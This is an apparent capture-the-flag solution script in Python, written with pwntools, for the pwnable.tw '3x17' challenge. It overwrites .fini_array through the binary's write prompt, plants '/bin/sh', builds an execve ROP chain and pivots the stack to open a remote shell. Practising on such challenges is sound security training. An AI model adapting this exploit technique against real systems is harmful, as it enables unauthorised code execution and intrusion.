
from pwn import *
import pdb


# p = process('/home/len/pwnable/3x17')
DEBUG = False



finit_array = 0x4B40F0
main_addr = 0x401B6D
__libc_csu_finit = 0x402960

leave_ret = 0x401c4b
ret = 0x442110
stack_addr = finit_array + 0x10

sh_addr = 0x4B9350

rax_ret = 0x41e4af
rdi_ret = 0x401696
rsi_ret = 0x406c30
rdx_ret = 0x446e35
syscall = 0x4478E4

p = None

if DEBUG: 
  p = process('/home/len/pwnable/3x17')
else:
  # p = remote('127.0.0.1', 8888)
  p = remote('chall.pwnable.tw', 10105)

if __name__ == "__main__":
  p.sendafter('addr:', str(finit_array))
  p.sendafter('data:', p64(__libc_csu_finit) + p64(main_addr))

  p.sendafter('addr:', str(sh_addr))
  p.sendafter('data:', '/bin/sh\x00')

  # ROP chain
  # rax
  # rdi_ret
  i = 0
  p.sendafter('addr:', str(stack_addr + i * 0x10))
  p.sendafter('data:', p64(59) + p64(rdi_ret))
  i += 1

  # rdi
  # rsi_ret
  p.sendafter('addr:', str(stack_addr + i * 0x10))
  p.sendafter('data:', p64(sh_addr) + p64(rsi_ret))
  i += 1

  # rsi
  # rdx_ret
  p.sendafter('addr:', str(stack_addr + i * 0x10))
  p.sendafter('data:', p64(0) + p64(rdx_ret))
  i += 1

  # rdx
  # syscall
  p.sendafter('addr:', str(stack_addr + i * 0x10))
  p.sendafter('data:', p64(0) + p64(syscall))

  # trigger
  p.sendafter('addr:', str(finit_array))
  pdb.set_trace()
  p.sendafter('data:', p64(leave_ret) + p64(rax_ret))


  p.interactive()
